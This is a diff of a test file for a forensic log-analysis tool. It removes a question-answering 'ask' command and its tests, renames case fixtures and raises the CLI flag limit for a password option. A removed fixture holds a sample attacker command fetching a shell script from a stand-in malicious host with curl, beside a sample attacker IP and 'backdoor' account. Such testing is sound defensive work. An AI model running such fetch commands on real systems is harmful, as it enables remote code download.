@@ -176,42 +176,6 @@ def test_analyze_does_everything_in_one_call(pkg: Path, tmp_path: Path):
     assert result.notable(), "high-severity events should be surfaced"
 
 
-def test_analyze_finds_and_answers_the_packaged_questions(pkg: Path, tmp_path: Path):
-    """No --readme flag: the task file is discovered inside the evidence."""
-    from inspecthor.analyze import analyze
-
-    result = analyze(pkg, out_dir=tmp_path / "out", detect=False)
-    assert len(result.questions) == 2
-    answers = {q: [c.answer for c in cands] for q, cands in result.answers}
-    ip_question = next(q for q in answers if "IP" in q)
-    account_question = next(q for q in answers if "account" in q)
-    assert "45.33.32.156" in answers[ip_question]
-    assert "backdoor" in answers[account_question]
-
-
-def test_analyze_falls_back_to_an_overview_without_questions(tmp_path: Path):
-    from inspecthor.analyze import analyze
-
-    root = tmp_path / "bare"
-    root.mkdir()
-    (root / "auth.log").write_text(NOYEAR_LOG)
-    result = analyze(root, out_dir=tmp_path / "out", detect=False)
-    assert not result.questions
-    assert result.overview, "with no task file it should still volunteer the basics"
-
-
-def test_find_task_file_prefers_one_that_has_questions(tmp_path: Path):
-    from inspecthor.analyze import find_task_file
-
-    root = tmp_path / "e"
-    root.mkdir()
-    (root / "readme.txt").write_text("Just a description, no questions here.\n")
-    (root / "task.md").write_text("1) What is the attacker IP?\n")
-    path, questions = find_task_file(root)
-    assert path is not None and path.name == "task.md"
-    assert questions
-
-
 def test_analyze_survives_evidence_it_cannot_read(tmp_path: Path):
     from inspecthor.analyze import analyze
 
@@ -223,16 +187,15 @@ def test_analyze_survives_evidence_it_cannot_read(tmp_path: Path):
     assert result.event_count > 0, "one unreadable artifact must not lose the case"
 
 
-def test_analyze_handles_a_password_protected_zip(tmp_path: Path):
+def test_analyze_opens_a_zipped_collection(tmp_path: Path):
     from inspecthor.analyze import analyze
 
-    archive = tmp_path / "sherlock.zip"
+    archive = tmp_path / "collection.zip"
     with zipfile.ZipFile(archive, "w") as zf:
         zf.writestr("auth.log", NOYEAR_LOG)
-        zf.writestr("readme.txt", TASK_FILE)
+        zf.writestr("notes.txt", TASK_FILE)
     result = analyze(archive, out_dir=tmp_path / "out", detect=False)
     assert result.event_count > 0
-    assert result.questions
 
 
 # ---- the four commands -------------------------------------------------------
@@ -255,7 +218,6 @@ def test_follow_up_commands_find_the_case_without_a_flag(
     monkeypatch.chdir(tmp_path)
     main([str(pkg)])
     assert resolve_case(None) is not None
-    assert main(["ask", "what is the attacker IP?"]) == 0
     assert main(["find", "45.33.32.156"]) == 0
     assert main(["timeline"]) == 0
     assert main(["timeline", "--all"]) == 0
@@ -265,7 +227,6 @@ def test_follow_up_commands_explain_when_there_is_no_case(tmp_path: Path, monkey
     from inspecthor.cli import main
 
     monkeypatch.chdir(tmp_path)
-    assert main(["ask", "anything"]) == 1
     assert main(["find", "anything"]) == 1
 
 
@@ -283,7 +244,7 @@ def test_cli_surface_stays_small():
     parser = build_parser()
     subs = [a for a in parser._actions if isinstance(a, argparse._SubParsersAction)]
     assert len(subs) == 1
-    assert set(subs[0].choices) == {"analyze", "ask", "find", "timeline"}
+    assert set(subs[0].choices) == {"analyze", "find", "timeline"}
 
     def count(sub_parser) -> int:
         return sum(
@@ -291,8 +252,11 @@ def test_cli_surface_stays_small():
             if not isinstance(a, (argparse._HelpAction, argparse._VersionAction))
         )
 
-    assert count(subs[0].choices["analyze"]) <= 8, "analyze grew too many flags"
-    for verb in ("ask", "find", "timeline"):
+    # 9 = evidence + --out --name --no-detect --rules --tz --year --host --password.
+    # The budget went from 8 to 9 once for --password, because an encrypted
+    # collection is otherwise a dead end. Spend the next one just as deliberately.
+    assert count(subs[0].choices["analyze"]) <= 9, "analyze grew too many flags"
+    for verb in ("find", "timeline"):
         assert count(subs[0].choices[verb]) <= 4, f"{verb} grew too many flags"
 
 
@@ -318,30 +282,6 @@ def test_every_cli_argument_still_documents_itself():
 
 
 # ---- answers -----------------------------------------------------------------
-
-
-def test_answer_rules_try_several_field_names():
-    """A command line is 'cmdline' from EVTX but 'cmd' from sudo."""
-    from inspecthor.sherlock import _value_for
-
-    row = {"data": {"cmd": "/usr/bin/curl http://evil.example.net/x.sh"}}
-    assert _value_for(row, ("cmdline", "cmd")).startswith("/usr/bin/curl")
-    assert _value_for(row, ("missing", "alsomissing")) is None
-
-
-def test_sudo_command_question_is_answerable(pkg: Path, tmp_path: Path):
-    """Regression: this returned nothing because only 'cmdline' was checked."""
-    from inspecthor.analyze import analyze
-    from inspecthor.sherlock import answer_question
-
-    result = analyze(pkg, out_dir=tmp_path / "out", detect=False)
-    store = CaseStore(result.db_path)
-    try:
-        candidates = answer_question(store, "what command did they run as root?")
-        assert candidates
-        assert any("curl" in c.answer for c in candidates)
-    finally:
-        store.close()
 
 
 # ---- standalone --------------------------------------------------------------
@@ -385,7 +325,7 @@ def test_reanalysis_replaces_instead_of_duplicating(pkg: Path, tmp_path: Path):
 
 
 def test_different_evidence_never_lands_in_the_same_case(tmp_path: Path):
-    """Two Sherlocks whose folders are both called 'evidence' must stay apart."""
+    """Two cases whose folders are both called 'evidence' must stay apart."""
     from inspecthor.analyze import analyze
 
     def make(root: Path, ip: str) -> Path:
@@ -441,10 +381,10 @@ def test_name_flag_controls_the_filenames(pkg: Path, tmp_path: Path):
     from inspecthor.analyze import analyze
 
     out = tmp_path / "out"
-    result = analyze(pkg, out_dir=out, case_name="Brutus Sherlock", detect=False)
-    assert Path(result.db_path).name == "brutus-sherlock.db"
-    assert Path(result.report_path).name == "brutus-sherlock-report.md"
-    assert Path(result.timeline_path).name == "brutus-sherlock-timeline.csv"
+    result = analyze(pkg, out_dir=out, case_name="Brutus Case", detect=False)
+    assert Path(result.db_path).name == "brutus-case.db"
+    assert Path(result.report_path).name == "brutus-case-report.md"
+    assert Path(result.timeline_path).name == "brutus-case-timeline.csv"
 
 
 def test_outputs_share_the_deconflicted_name(tmp_path: Path):
